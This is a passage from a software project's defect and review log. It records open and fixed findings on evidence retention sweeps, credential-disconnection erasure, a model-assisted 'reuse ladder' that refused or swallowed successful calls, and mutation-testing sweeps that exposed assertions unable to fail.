  READER'S own run when it can no longer resolve the action"* and *"the writing org's own
  reconciliation"* are gone; that paragraph outlived them by a round, which is the same class of
  stale claim round six is otherwise cleaning up. **Pin release is now exactly three things**: the
  owner's erasure control (`DELETE /api/v1/integrations/:key/actions/:actionName/evidence`), the
  credential disconnection, and the retention sweep at 90 days (`sweepExpiredEvidence`) - plus
  the structural supersede, which releases the previous pin whenever a newer validated run replaces
  the row. **The bound is therefore carried entirely by the sweep**, which is what round six pins
  (`the-retention-window-was-a-number-no-test-could-tell-from-any-other`, below): before it, nothing
  stopped that 90 from becoming a 1 and taking every pinned run's PNGs with it on the next boot.
  Round nine then gave the sweep a TRIGGER - it ran only at boot, so the bound was carried by a
  deploy rather than by the sweep (`the-90-day-bound-was-contingent-on-somebody-deploying`).
  Unchanged: `deleteRunScreenshots` still has no production caller, and this entry still claims no
  erasure coverage over the screenshot tree.

- **`evidence-orphan-window-until-ttl`** (2026-08-20, OPEN, **LOW**, opened DELIBERATELY by S1
  round four and WIDENED DELIBERATELY by round five - the accepted cost of the fix above. RENAMES
  and REWRITES `evidence-orphan-window-until-the-reader-returns`: the old slug named a bound that no
  longer holds, and what it claimed is quoted below rather than quietly dropped).

  **THE WINDOW IS NOW UNIFORM AND IT IS UP TO `EVIDENCE_RETENTION_DAYS` (90 DAYS) PLUS ONE SWEEP
  INTERVAL.** An evidence row whose action nobody can reach again is ended by exactly three things,
  and only one of them is automatic: the retention sweep at 90 days (at boot and every
  `RETENTION_SWEEP_INTERVAL_MS`), the owner's own
  `DELETE /api/v1/integrations/:key/actions/:actionName/evidence`, and a newer validated run
  superseding it (which cannot happen for an action nobody can run). `deleteConfig` also erases what
  a disconnected credential produced. Nothing else collects. So an orphan persists - as a durable
  sample of its owner's own third-party account, and, for an automation-backed row, as a screenshot
  pin exempting that run's PNGs from the 7-day sweep - until one of those, whichever comes first.

  **THIS IS WIDER THAN THE ROUND-FOUR ENTRY DESCRIBED, AND SAYING SO IS THE POINT.** Round four also
  claimed the owner's own next run would collect it, and the writing org's next definition save
  would collect its own tenant's. Both collectors are deleted (see the round-five fixed entries
  below), because both answered *"is this action gone?"* synchronously - at one instant, from one
  vantage - about a row whose lifetime is durable, and both destroyed data that was not stale. So
  where round four said "up to 90 days for a reader who never comes back", round five says **up to
  90 days, for everybody, unless they ask.**

  **WHY THIS IS THE ACCEPTED SIDE OF THE TRADE, STATED AS A TRADE AND NOT AS A CLOSURE.** An
  orphaned row is a BOUNDED retention and privacy gap: at most 90 days, uniform, closable at any
  moment by the one person whose data it is, and only ever that person's own sample. A
  wrongly-deleted row is unrecoverable tenant data - somebody's only copy of a real client name and
  a real processo number. Those costs are not comparable, and **four rounds and five defects are the
  evidence that the guess is not reliable enough to spend the second one.** This entry is OPEN, not
  accepted-by-design, because 90 days of retained third-party samples for an action nobody can run
  is a real cost that a future slice may want to shorten - it is simply not a cost worth closing with
  another synchronous collector.
  CONSEQUENCE IF NOT CLOSED: a sample of a third-party account, and the screenshots behind it,
  outlive the reachability of the action they document by up to 90 days.
  CLOSE BY (optional, only if the window is judged too long, and only with a DURABLE signal):
  shortening `EVIDENCE_RETENTION_DAYS`; surfacing the owner's existing DELETE control on the S2/S3
  detail page so asking is easy; or a per-owner opt-in retention setting. **NOT by re-introducing a
  synchronous collector on any write, any run, any read or any boot-time reachability check, under
  any scope or any actor** - that is the exact thing four rounds proved does not work, and the
  round-five decision entry exists to stop the fifth attempt.

  **THE "AT MOST 90 DAYS" BOUND IS NOW ENFORCED, added round six** (2026-08-20). Until then this
  entry's central number was pinned by nothing: 90 -> 1 left every suite green while deleting all
  tenants' evidence a day after their last run. `sweepExpiredEvidence - the retention bound` in
  `api/tests/integrations/action-evidence.test.ts` restates 90 as a literal and straddles the cutoff
  by half a day either side, so any integer change reddens it - including the shortening this entry
  lists as a legitimate close path, which must therefore move that literal in the same commit. See
  `the-retention-window-was-a-number-no-test-could-tell-from-any-other` below. The WINDOW itself is
  unchanged and this entry stays OPEN.

  **AND THAT PARAGRAPH WAS WRONG, CORRECTED ROUND NINE** (2026-08-21). It said the bound was
  ENFORCED. Round six enforced the CONSTANT and not the TRIGGER, and there was no trigger: between
  them `sweepExpiredEvidence` and `sweepExpiredScreenshots` had exactly one caller chain -
  `sweepScreenshotsSparingPinnedEvidence` -> `bootState` -> `boot()` - with no `setInterval` and no
  Mongo TTL index anywhere in the repo, in a deployment (`restart: unless-stopped`, persistent volume)
  built not to restart. **An api container six months without a deploy held every row for six months**,
  with every automation-backed row's screenshot pin. Enforcing a number nothing fires is enforcing
  nothing, and this entry said otherwise for three rounds. Closed by
  `the-90-day-bound-was-contingent-on-somebody-deploying` below. **THE WINDOW THIS ENTRY IS ABOUT IS
  NOW `EVIDENCE_RETENTION_DAYS` PLUS AT MOST ONE `RETENTION_SWEEP_INTERVAL_MS` (6h)**, which is what
  every "at most 90 days" sentence in this file now says; the entry stays OPEN on the size of the
  window, which is unchanged.

- **`evidence-of-a-replaying-action-ages-out-while-the-action-is-in-daily-use`** (2026-08-21, OPEN,
  **LOW on this branch, MEDIUM the moment S2/S3 mounts**; S1 round eight. Found by reading the
  `EVIDENCE_RETENTION_DAYS` docblock against the discovery spine, not by a failing test - nothing
  could have failed, because the claim was not asserted anywhere).

  **THE CLAIM THAT WAS FALSE.** `EVIDENCE_RETENTION_DAYS`'s docblock read *"Every successful run
  rewrites `validatedAt`, so an integration in real use never ages out - only one nobody has run for
  a quarter of a year"*, and four documents rest their accepted-cost argument on the shape of that
  sentence (this file's `evidence-orphan-window-until-ttl`, `docs/decisions.md`,
  `docs/architecture.md`, and the store's own header). It is FALSE for exactly the path this platform
  is built around. A `browser-steps` READ action is `storable` (`automation/service.ts`:
  `named && !mutating`), so its FIRST run compiles a recipe and every later run REPLAYS. A replay
  answers with a `replay-<uuid>` id that by construction has no `automationRuns` document behind it,
  so `collectRunEvidence` returns null, the executor's capture closure returns null, and NOTHING IS
  RECORDED. An action run successfully every single day for ninety days keeps the stamp of its first
  run, is deleted at the next sweep after that, and releases its screenshot pin on the way out.

  **WHAT IS AND IS NOT AFFECTED.** Refreshing paths: every `api-call` action; a mutating
  automation-backed action (never `storable`, so it never replays); an automation-backed read whose
  passes have compiled nothing yet. No user-visible impact on THIS branch: the evidence row has no
  production reader (the detail page is S2/S3), and authored actions are api-call-backed only
  (`authored-action.ts` refuses an `automationBinding`), so every promotion-relevant success does
  still record. It lands the moment either mounts.
  CONSEQUENCE IF NOT CLOSED: the detail page of a healthy, daily-driven browser-steps integration
  shows an empty evidence panel after 90 days, and a promotion gate that ever covers automation-backed
  actions refuses one that has demonstrably been working all along.
  CLOSE BY: a RE-STAMP operation on `ActionEvidenceStore` - "the sample I already hold is still
  current", bumping `validatedAt` and leaving `evidence` untouched - called from the replay leg with
  the same (org, owner, key, action) tuple. It cannot be closed by re-collecting: there is no run to
  collect, which is precisely what the collector's null means. **NOT by widening what
  `collectRunEvidence` accepts** - a `replay-…` id names no run record, and inventing a sample for it
  would put a trace nobody produced into a durable row.

- **`evidence-of-a-shared-credential-survives-its-disconnection`** (2026-08-21, OPEN, **LOW**; S1
  round eight. A docblock asserting an invariant the code does not have, in the retaining direction).

  **THE CLAIM THAT WAS FALSE.** `DisconnectedConfigScope`'s docblock said the org-shared exclusion
  list is safe because *"a member holding their own config for the key never resolved the deleted one
  and their sample is a sample of a credential they still have"*. ORDERING breaks it. Member M runs
  the action while the org-shared credential is the only one there is, so M's row holds the SHARED
  account's request and response. M later connects a credential of their own. An admin disconnects
  the shared one: `stillOwnTheirOwn` (`integrations/service.ts`) now contains M, M's row is excluded
  from the `$nin` erasure, and a sample of the DISCONNECTED account outlives the disconnection.

  **WHY IT IS NOT FIXED HERE.** The exclusion list is a statement about who would resolve this row
  NOW, and no list computed at the instant of the delete can be right about a durable row's past: the
  row records `ownerUserId`, `backingType` and `shape`, never WHICH credential produced it. The
  alternative - erase every owner in the org - is the round-four defect this arm exists to correct,
  which destroyed the samples of credentials people still hold. It is the same "one instant cannot
  answer a question about a durable row" shape the store header spends forty lines on, and it errs the
  same way: towards retaining.
  CONSEQUENCE IF NOT CLOSED: one org-shared account's real request and response body survive that
  account's disconnection - bounded by `EVIDENCE_RETENTION_DAYS` plus one
  `RETENTION_SWEEP_INTERVAL_MS`, and closable at any moment by the row's owner
  (`DELETE /api/v1/integrations/:key/actions/:actionName/evidence`).
  CLOSE BY (only with a DURABLE signal): stamping the evidence row with the CONFIG it ran under at
  write time, so the disconnect erasure is keyed on a fact about the row rather than on a
  reconstruction of who resolves what today. **NOT by widening the erasure back to every owner in the
  org.**

- **`the-compose-post-stage-could-still-destroy-a-spent-200-by-THROWING`** (**FIXED 2026-08-20**,
  S4/S5 round five, was BLOCKER; see `docs/decisions.md` D-S5-4). The fourth consecutive round of one
  defect, and this is the exit the previous three did not cover, because a return type cannot forbid
  an exception.
  `achieveCollections.read` is bound in `server.ts` to `CollectionsEngine.list` - a live Mongo query
  that rejects on a dropped connection, a timeout or a replica-set election. The rejection propagated
  out of `applyComposition`, out of `runMatchedAction`, out of `achieveIntegrationGoal` and into the
  route's error handler. So: the caller's request reached the third party, the third party answered
  200 with the rows, OUR database blipped, and the caller got a 500 from us and nothing else. The
  side effect was spent and the rows were in hand at the moment the post-stage failed.
  Round three stopped the post-stage RETURNING a refusal; round four stopped it returning one after a
  successful execute and removed all three refusal codes; neither closed this. **A refusal, a
  swallowed answer and an exception are three exits from one wrong idea.**
  FIXED BY SHAPE, not by wrapping a branch: each stage is split into a WORKER (`attemptComposition`,
  `draftCompositionPlan`) that touches the seams, may throw, and writes nothing at all, and a
  RECORDER (`applyComposition`, `planComposition`) that converts every outcome - a rejection included
  - into exactly one ladder step plus a null/none. A half-written ladder is therefore impossible by
  construction rather than by checking each branch. The PLANNING stage got the same treatment: it
  runs before the execute, so a rejection there stopped the request going out at all.
  What a throw puts on the wire is FIXED TEXT; the driver's own message (namespace, replica-set host,
  query shape) is logged for an operator and never travels.
  PINNED AT BOTH LEVELS, and the wire-level pin is the load-bearing one: the contract suite injects
  ONE rejection into the real `CollectionsEngine.list` the real composition root binds and requires a
  200 whose body is the executed arm - `result.data.processos` complete, no `items`, no
  `composition`, `compose` recorded `refused`, `reuse` recorded as the rung that answered, no audit
  row, and the injected failure text nowhere in the body. Verified RED by restoring
  `return await attemptComposition(...)` with no `try`.

- **`the-fail-closed-mutates-reading-on-the-compose-gate-was-unfailable`** (**FIXED 2026-08-20**,
  S4/S5 round five, was MAJOR; see `docs/decisions.md` D-S5-4). `planComposition` gates on
  `action.mutates !== false`, and the only fixture guarding it declared `mutates: true` - against
  which `!== false` and `=== true` are the SAME PREDICATE. An equivalent mutant presented as a fix,
  and the identical shape P2 was caught in with the identical field.
  The reading is now observable AT THIS SEAM, with a caller that does not normalise, and the reason
  such a caller exists is a fact about the code: `definitions.ts` builds a package definition's
  actions as `config.actions ?? []` off an unvalidated `config.json`, and `definition-store.ts`
  persists an agent-authored action through `withoutRecipes`, which returns it verbatim. An action
  with NO `mutates` key is a production shape. The test seeds exactly that through
  `integrationDefinitionStore.create` - the real writer - and requires no planning turn, no
  `listCollections` call and no read, with the call itself still running. `=== true` reds it.

- **`all-four-ordering-operators-could-lose-their-Number-coercion`** (**FIXED 2026-08-20**, S4/S5
  round five, was MAJOR; see `docs/decisions.md` D-S5-4). `lt`, `lte`, `gt` and `gte` in
  `data/simple-query.ts` coerce both sides with `Number()`. Deleting ALL FOUR coercions at once left
  every suite in the repo green, because every fixture anywhere compares numbers to numbers and JS
  answers the same either way.
  Without them JS compares strings LEXICOGRAPHICALLY. `app_data` holds whatever an app wrote - a
  form-entered age is a string, a CSV/ERP import writes strings - and on the compose rung the
  compared VALUE is a model's JSON, which may be `"40"`. On the rung whose canonical demo is
  "clients under 40", `lt "40"` over string ages then DROPS the nine-year-old (`'9' < '40'` is false)
  and ADMITS the hundred-year-old (`'100' < '40'` is true): the wrong answer, delivered confidently,
  with a summary saying how it was built. It also reaches every shipped recipe, since `store.query`
  runs the same predicate.
  Closed with a string-age fixture (`'9'`, `'31'`, `'40'`, `'100'`) against a string bound where the
  two orderings disagree for each of the four operators, driven through `store.query`'s primitive AND
  asserted directly on `matchesSimpleQuery`. Each operator mutated INDIVIDUALLY and each reds.

- **`seven-more-assertions-in-the-reuse-ladder-suite-could-not-fail`** (**FIXED 2026-08-20**, S4/S5
  round five, LOW severity, process finding; see `docs/decisions.md` D-S5-4). A 55-mutant source-side
  sweep (each mutant applied to the SOURCE, run against all four slice suites, restored, verified
  byte-identical by sha1) returned TEN survivors. One was a STALE ANCHOR - the mutant added a comment
  rather than changing behaviour - and is recorded as such and re-run properly rather than counted.
  SEVEN were real and are closed by tests, each killed in a confirmation pass:
  (a) `compose === false` -> `!== true`: `{}`, `{compose: 0}` and `{compose: "no"}` all read as a
  deliberate DECLINE, so the deterministic suite answered `passed: true` about a plan it never
  validated and the ladder recorded a skip with no violations.
  (b) the shape check for an EMPTY `collection` - the sibling of the missing-`collection` case round
  four closed, whose fix was written for `undefined` alone. Only the CHECK LIST distinguishes them.
  (c) `parseComposePlan`'s FENCE TAG could be relaxed to any fenced block. Both rungs share one
  authoring core and one repair loop, and planning replies carry illustrative ```json blocks, so a
  tag-blind parser hands the wrong artifact to the suite and repairs against violations about
  something the model never proposed. `parseArgsPlan` had the same hole; both asserted, both ways.
  (d) `!ctx.planStep || !ctx.appCollections` -> `&&`: no fixture wired exactly ONE seam. Under `&&` a
  deployment binding one and not the other reads the caller's whole collection list out of the store
  for a rung that cannot ask anybody about it.
  (e) and (f) the compose rung's and the parametrize rung's `checkAllowance` gates, both deletable
  and green. These rungs SPEND A MODEL CALL; a billing-locked tenant getting free planning turns is
  the gate not existing. The same test pins the other half of the invariant: the READ is not
  billing-gated, so the locked tenant still gets their answer.
  (g) `neq` strict -> loose. `eq` was pinned in an earlier round and its twin twenty characters away
  was not, because every `neq` probe compared same-typed values.
  (h) `listCollections`' `.sort()`, deletable and green - every fixture happened to be written in
  sorted order. Those names go into a MODEL PROMPT, so their order is part of the input to a
  nondeterministic step: unsorted, the same tenant asking the same goal twice is asked a different
  question. (Counted with the seven above as the eighth item; the headline count of SEVEN is the
  number that had a behavioural consequence for a caller.)
  DISMISSED, IN WRITING, EACH WITH THE CLAIM THAT IS TRUE ASSERTED IN ITS PLACE:
  `runMatchedAction`'s `if (!out.ok) return out;` is UNREACHABLE - `executeIntegrationCapabilityAction`
  has exactly one `ok: false` (`no_tenant`) and `achieveIntegrationGoal` refuses a tenantless actor
  upstream, while a remote 500, an unknown action and `awaiting_consent` all arrive as `ok: true`
  with the answer inside `result`; the line stays as defensive redundancy and the REASON it is
  unreachable is now asserted from both sources. `ownerSharedScope`'s `appId` can be any string
  because `Scope.appId` is never part of a query - the mutant surviving CONFIRMS the design, and what
  is now asserted from the engine's source is that every filter binds `appId: scope.scopeKey` and
  none reads `scope.appId`. The caller-args spread order, re-confirmed for the third round. And
  `if (!verdict.passed || !verdict.args)` -> `if (!verdict.args)`, redundant by construction because
  `verifyPlannedArgs`'s `done()` nulls `args` whenever `passed` is false.

- **`the-canonical-ongoing-processes-action-is-unreachable-from-the-canonical-goal`**
  (**CLOSED 2026-08-22 by S9**; opened 2026-08-20, S5, MEDIUM). Both facts below were addressed, and
  the mechanism for each is named at the end of this entry rather than asserted.
  TWO separate facts, and the second survives fixing the first.
  (a) `get-ongoing-processes` DOES NOT EXIST: `grep -ri 'ongoing.process|processos em curso'` over
  `api/`, `shared/` and `web/` returns nothing, and the nearest identifiers are the two DECLARATIVE
  Citius actions (`consultar_processo`, `fetch_documentos_processo`, both singular-by-number, both
  natural-language browser-step templates with zero TypeScript). VERIFICATION.md blocker 5 still
  holds unchanged.
  (b) EVEN ONCE IT EXISTS, THAT NAME CANNOT BE REACHED BY THAT GOAL. `matchActionForGoal` requires
  the goal to name EVERY token of the action's name; `get` is a stopword, so `get-ongoing-processes`
  tokenises to `{ongoing, processes}`, and "todos os processos de clientes com menos de 40 anos"
  contains neither. The action a Portuguese goal can reach is one whose name the goal covers
  (`processos`, `processos_em_curso` only if the goal says "em curso", and so on). This is a NAMING
  constraint the lexical planner imposes on every action the product ships, not a defect in it -
  the coverage rule is the deliberate safety property - but it means S9 must name the Citius action
  in the language and words its callers will actually use, or callers must name it exactly.
  WHAT IS CLOSED ALREADY: the compose rung's canonical test is committed against a deterministic
  local fixture of the same shape and says so in its own header, and the naming fact is pinned as an
  assertion (`matchActionForGoal(CANONICAL_GOAL, [get-ongoing-processes]) === {kind:'none'}`) in
  `api/tests/integrations/achieve-reuse-ladder.test.ts`, so it cannot be forgotten between here and
  S9. WHAT IS NOT: the Citius path itself is NOT claimed as proven by this slice, and a real session
  is still the only thing that can prove it.
  **HOW S9 CLOSED IT** (decisions.md 2026-08-22, D-S9-1 through D-S9-5).
  (a) THE ACTION NOW EXISTS, and it is not the automation the plan imagined. The shipped `citius`
  package declares `processos`, a `tenant-read`-backed action over the rows `legal/citius-sync.ts`
  already lands (`api/src/legal/citius-processos.ts`, dataset `citius.processos`). The alternative -
  a second browser-steps walk of the portal - was rejected because it would be a SECOND Citius
  enumerator re-deriving the sync rail's five hazards, four of which are silent when got wrong, and
  because nothing in CI could ever prove it (D-S9-1).
  (b) THE NAME IS ONE THE GOAL COVERS. It is called `processos` precisely because the coverage rule
  says `get-ongoing-processes` is unreachable. Both halves are now pinned against the REAL package
  in `api/tests/integrations/citius-processos-ladder.test.ts`: the canonical goal resolves the
  shipped action and reaches NO OTHER action in the package (including, load-bearingly, the mutating
  `submeter_peca`), and renaming the shipped action to the plan's name makes the goal stop reaching
  it. The negative assertion in `achieve-reuse-ladder.test.ts` stays where S5 put it.
  THE CANONICAL GOAL NOW RESOLVES END TO END through the real registered action: rows landed by the
  REAL `syncCitiusNotifications`, read by the REAL executor through the REAL capability core,
  narrowed by the REAL compose rung against the tenant's `clientes` collection - joining the action's
  `processo` against the collection's `numeroProcesso`, which is the direction the data actually
  runs, since Citius knows nothing about a firm's clients.
  **CORRECTED 2026-08-23 (review round).** Two claims in the paragraph above were wider than the
  mechanism and are fixed rather than left standing. (a) "narrowed by the REAL compose rung against
  the tenant's `clientes` collection" - the RUNG is real (its output contract, parser and
  deterministic guardrail suite all run), but the COLLECTION side is an in-memory `AppCollections`
  seam, not `CollectionsEngine` through the composition root; the real binding is covered by
  `security/achieve-compose-isolation.test.ts`. (b) "faked at exactly ONE seam" held only for the
  row-landing helper: the ladder suite also doubles the planning turn and the collections seam, and
  the schedule suite doubles the automation seam, the evidence collector and the notifier. Both
  suites now carry inventories instead of the one-seam claim.
  **WHAT IS STILL NOT PROVEN, AND IS NOT CLAIMED.** The portal transport is faked at exactly one seam
  (CS4's `enumerate`) in both new suites, because a real Citius session cannot exist in CI. So: that
  the authenticated inbox HTML PARSES is unobserved (every fixture in this workstream is
  speculative); that `citius-notificacoes-template` drives the live site is unobserved; and the SIZE
  OF THE COVERAGE GAP - `processos` answers "processes with notifications", not "processes", so a
  case dormant in the swept window does not appear - is unmeasured. That last one is the residual
  this entry hands to the acceptance run: **measure the gap against a real caseload and record it
  here**. If it is material the action gains a second source (D-S9-1's review date); if not, D-S9-1
  is confirmed and the automation template leaves the backlog.

- **`a-bare-noun-action-name-makes-the-verb-omission-rule-vacuous`** (**FIXED 2026-08-23**, S9 review
  round, MAJOR; see `docs/decisions.md` D-S9-6). `matchActionForGoal`'s safety property is "a goal
  that omits the verb omits the action", and it is a property of names that CARRY a verb. A name
  tokenising to a bare noun has no verb to omit, so every goal naming that noun covers it - including
  goals asking to destroy the thing. `achieve` then ran the trusted read and answered
  `outcome: 'executed'`, a claim that a delete/archive/cancel goal had been ACHIEVED when all it did
  was list. Nothing was destroyed and nothing leaked (the actions are reads, tenant-scoped); the harm
  is a false-success decision surface feeding agent chains, schedules and API consumers.
  **THIS WAS NOT NEW IN S9, AND THE REVIEW'S VERDICT SAID IT WAS.** The verdict states that every
  name shipped on main is multi-token verb_noun. That is true of the literal names and false after
  tokenisation, because `get` is a STOPWORD: `get_file`, `get_profile`, `get_agreement`,
  `get_invoice` and `get_request` all tokenise to one token. Verified against the real matcher rather
  than a copy of it - "delete the file from the drive" matches `get_file` as `one`, "cancel the
  agreement" matches `get_agreement` - so google-workspace, microsoft-365, invoicexpress,
  adobe-acrobat-sign and zoho-sign have carried this against real third-party accounts since long
  before this slice. `citius processos` is the sixth instance; finding it is what found the class.
  FIXED on the reuse rung, where it covers every package: `mutatingGoalAgainstRead` refuses
  `read_only_match` when a goal names a state-changing verb and the matched action declares a literal
  `mutates: false`, naming the read so a caller who meant it can ask by name. A rename was rejected
  on evidence: a verb-bearing name is UNCOVERED by the canonical goal (probed for
  `consultar_processos` and `listar_processos`), so it would have un-closed the finding above, and it
  would have left the other five actions exposed.
  RESIDUAL, recorded rather than hidden: the verb list is a closed PT+EN list of unambiguously
  state-changing words, so a read goal that happens to name one ("listar os processos que vou
  apagar") is refused. The refusal names the action, making it a redirect rather than a dead end.

- **`two-composition-root-bindings-were-re-declared-instead-of-driven`** (**FIXED 2026-08-23**, S9
  review round, MAJOR; see `docs/decisions.md` D-S9-7). Two S9 suites carried comments claiming they
  bound seams "BYTE FOR BYTE" as `server.ts` does, and rested their proves-the-wiring claims on
  copies. A copy of a binding proves nothing about the binding: mutating `.then(mapIntegrationOutcome)`
  on the supervisor seam (so a consent-blocked schedule records `failed` and `notifyBlocked` never
  fires) and deleting `readTenantDataset` from the `integrationsRouter` mount (so the shipped action
  dies on the HTTP execute and `achieve` rails while schedules keep working) each left the whole lane
  green. Both are now DRIVEN through the real `buildApp` in
  `api/tests/contract/citius-tenant-read-wiring.test.ts`, and both mutants verified dead. This is the
  "pins the MAPPING, not the BINDING" class `composition-root-action-seam.test.ts` was created for,
  reappearing two call sites over in the same slice that cited it.

- **`the-reuse-ladder-made-a-working-call-worse`** (**FIXED 2026-08-20**, over FOUR rounds and not
  one; was MAJOR x5. See `docs/decisions.md` D-S5-1, D-S4-2 / D-S5-2a, and D-S5-3). One rule broken
  five times: a ladder may add cheaper ways to answer, and may never take away an answer the product
  already has.
  **THIS ENTRY WAS MARKED FIXED AFTER ROUND THREE AND WAS NOT FIXED.** That is recorded here rather
  than quietly corrected, because a closed finding nobody looks at again is worse than an open one.
  Round three closed (a) and (b) and then claimed the RULE - and the rule was still broken on the
  three paths in (c), on the very rung the entry was about. Each claim below is now backed by a test
  that reds when the pre-fix behaviour is restored in the source.
  (a) PARAMETRIZE SUBTRACTED ANSWERS (round three). A model plan that failed `verifyPlannedArgs`
  refused the whole call (`parametrize_refused`) - so a call that had been executing with the
  caller's own arguments stopped executing because a model wrote a bad one. FIXED: the plan is
  discarded (`verdict.args` is null, so not one model value survives), the request goes out as the
  caller shaped it, and the rung is reported `refused` WITH its `violations` on the ladder beside the
  answer. `parametrize_refused` removed from the refusal union.
  (b) COMPOSE SWALLOWED THE UPSTREAM FAILURE (round three). A failed execute carries no `data`, so
  `rowsOf` read `unshaped` and the caller was told "the action returned no list to compose over"
  instead of the remote's own 500 - a less accurate story, naming the wrong system. FIXED: `!success`
  returns on the `executed` arm verbatim, before the collection is read, compose recorded `skipped`.
  (c) THE COMPOSE RUNG STILL SUBTRACTED, ON THREE MORE PATHS, AND TWO OF THEM DID IT **AFTER THE
  REMOTE CALL HAD ALREADY BEEN MADE AND HAD SUCCEEDED** (round four, D-S5-3). An unknown collection
  (`compose_unknown_collection`) and an unshaped result (`compose_unshaped_result`) are both decided
  DOWNSTREAM of the execute: the product performed the caller's work against a third party, got a
  good 200 back, and then handed over a refusal - spending the side effect and discarding the result,
  which is worse than refusing up front. A rejected compose plan (`compose_refused`) was decided
  before the execute, but it still ended a call that executed before this slice existed, and the
  source's own defence of it ("refusing costs the caller a call they have not yet made") was untrue:
  the caller HAD made the call. FIXED STRUCTURALLY rather than by patching three branches -
  `planComposition`'s return type lost its refusal member (a model's answer can no longer be
  expressed as an end to the call), the post-stage became `applyComposition` returning rows-or-NULL,
  and `runMatchedAction` now has exactly ONE exit for an admitted call that was not composed, always
  carrying `out.value`. All three codes are removed, so the ladder introduces NO refusal code at all
  - a count a test asserts, rather than a sentence three documents repeated.
  PROVEN BY MUTATION, each mutant restored byte-identical: restoring any of the five pre-fix
  behaviours reds `api/tests/integrations/achieve-reuse-ladder.test.ts` and/or
  `api/tests/contract/integrations-reuse-ladder.test.ts`.

- **`three-docs-and-both-diagrams-asserted-the-ladder-invariant-the-code-broke`** (**FIXED
  2026-08-20**, S4/S5 round four, was MAJOR; see `docs/decisions.md` D-S5-3). The documentation half
  of the finding above, recorded separately because it is a distinct failure mode: **the prose was
  the only thing asserting the invariant, and prose cannot be mutated.** `architecture.md` said "the
  only refusals the ladder introduces are the `compose_*` codes, every one of them decided BEFORE
  anything runs"; `decisions.md` D-S4-2 said the same sentence, indented under the rule it was
  breaking; `security.md` described `compose_unknown_collection` as the answer for an unresolvable
  name; `02-module-map` note (c) declared the rule enforced "on every rung, for good"; `05-data-model`
  note (c) said "exactly four ladder codes" and then listed THREE. Six statements, one true claim
  between them. FIXED: every one rewritten or superseded (the journal is append-only, so D-S4-2 is
  superseded rather than edited), and the invariant re-expressed as the COUNT of members in
  `AchieveRefusalCode` - which `achieve-reuse-ladder.test.ts` asserts against the source, and which
  reds if any of the removed codes is reintroduced.

- **`six-more-assertions-in-the-reuse-ladder-suite-could-not-fail`** (**FIXED 2026-08-20**, S4/S5
  round four, LOW severity, process finding). A 54-mutant source-side sweep over the four slice
  suites (each mutant applied to the SOURCE, run, restored, verified byte-identical) returned EIGHT
  survivors; a 31-mutant confirmation pass over the fixed code returned one more the first pass had
  not written a mutant for. SIX were real, and the count is stated as six rather than rounded to the
  four the review round expected:
  (a) `COMPOSE_MAX_ITEMS` was never pinned to a literal. Every assertion about it was written in
  terms of the constant, so 200 could drift to any value and the estate stayed green - exactly the
  defect round three closed for `COMPOSE_MAX_COLLECTION_ROWS`, the sibling constant twenty lines
  away. Closed by a literal pin.
  (b) The "the compose stage reaches no store of its own" STATIC GUARD could not fail: it searched
  for `collections-engine.js').CollectionsEngine`, a CommonJS `require(...)` shape an ESM file cannot
  produce, while the real hazard - `import { CollectionsEngine } from '../data/collections-engine.js'`
  - passed it. Proved by adding that exact import: all four suites stayed green. The guard now reads
  the module's IMPORT LIST and requires it to be exactly `['collectionName']`, with a dynamic-import
  probe beside it.
  (c) `argSlotsOf`'s QUERY-PARAMETER slot had no case. D1 names path AND query; the header slot got
  its own test in round three and the path slot has several, but the only fixture carrying a query
  template is a READ, where `mayBeModelFilled` answers true whatever the slot says. Not a live escape
  (the allowlist refuses `unused` as firmly as `targeting`), but D1's stated rule unasserted and the
  prompt's slot table telling a model the wrong thing. Closed with a write-plus-query fixture.
  (d) `contains` could be `startsWith` and nothing noticed: every probe in
  `store-query-predicate.test.ts` compared a PREFIX (`'PT'` against `'PT-100'`). `contains` is one of
  the nine comparisons every shipped recipe may already use, and that file exists precisely to prove
  the extraction changed no semantics. Closed with a mid-string match.
  (e) `String(field ?? '')` could lose its `?? ''`: the only assertion touching the field-absent row
  uses `value: ''`, which every string operator satisfies either way. Without the coercion an ABSENT
  field becomes the literal text `undefined`, so a recipe filtering `starts_with 'und'` would start
  selecting rows holding no such field. Closed on all three string operators.
  (f) `ends_with` could be `includes`, and THE FIRST PASS DID NOT ASK - a lesson about the sweep
  rather than about the suite. No `ends_with` mutant was written, so its absence of a result read as
  coverage; the confirmation pass wrote one and it survived, because the fix for (d) had added an
  `ends_with '-100'` case and a suffix is also a substring. Closed by asserting the negative
  direction for the suffix and prefix operators alike.
  DISMISSALS, in writing: the caller-args spread order is the true equivalent mutant already
  recorded in D-S5-1 (re-confirmed); `renderTemplate`'s `?? '{{name}}'` fallback is DEAD CODE at
  every call site (`vars` is pre-filled from exactly the names found in the three templates that are
  then rendered), recorded in the source instead of covered by a contrived test; and
  `verifyComposePlan`'s missing-`collection` shape check changes no verdict because `collection_name`
  refuses `undefined` too - but the CHECK LIST distinguishes them, and "nothing below `shape` is
  judged on a malformed plan" is a rule the parametrize suite already asserts, so that one is closed
  by a test rather than dismissed.
  AND ONE MORE, recorded because pretending otherwise would be the fake substitution this process
  exists to prevent: the isolation suite's no-existence-oracle EQUALITY (the whole response body for
  a name another org holds compared against the body for a name nobody holds) is a REGRESSION GUARD,
  not a killable assertion. No mutation of `applyComposition` can break it, because the module cannot
  reach another tenant's scope and therefore has no fact about one to leak - a mutant that fabricated
  a difference out of `actor.orgId` survived, correctly, since it did not vary with the thing it
  claimed to disclose. What IS killable is the shape that makes the oracle impossible, and that is
  what is now asserted: `AppCollectionRead`'s not-found answer is a bare tag, and giving it a payload
  reds the source guard in `achieve-reuse-ladder.test.ts`.

- **`compose-max-collection-rows-truncated-the-join-silently-and-unpinned`** (**FIXED 2026-08-20**,
  S4/S5 round three, was MAJOR; see `docs/decisions.md` D-S5-2b). Two defects in one constant.
  (a) A SILENT WRONG ANSWER: the join built its key set from the first 5000 collection rows with
  nothing on the wire to say so, so an action row whose client sits past row 5000 was dropped from an
  answer presented as the whole. Distinct in kind from `COMPOSE_MAX_ITEMS`, which truncates a list
  the caller can SEE is truncated. FIXED: `collectionScanned` + `collectionTruncated` on
  `ComposeSummary`, on the shared `AchieveComposition` (additive; OpenAPI + cortex-cli regenerated in
  the same commit), in the ladder detail and on the audit row.
  (b) AN UNPINNED BOUND: deleting the cap left the estate green. FIXED: the flag is derived from the
  WORK DONE (`collectionRows.length > considered.length`), not from the constant, so deleting the cap
  reads `false` and reds; a boundary pair at exactly 5000 and 5001 rows with the only matching row
  last, plus a literal value pin, reds on deletion, on a one-row drift and on the signal being
  silenced. All three mutants run.

